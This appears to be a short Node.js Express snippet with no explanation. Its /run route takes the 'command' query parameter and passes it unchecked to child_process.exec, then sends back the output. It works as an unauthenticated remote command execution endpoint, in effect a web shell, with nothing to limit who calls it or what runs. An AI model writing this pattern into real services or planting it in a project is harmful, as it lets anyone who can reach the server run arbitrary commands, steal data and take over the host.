const { exec } = require('child_process');
const express = require('express');
const app = express();

app.get('/run', (req, res) => {
    const cmd = req.query.command;
    exec(cmd, (err, stdout, stderr) => {
        res.send(stdout || stderr);
    });
});
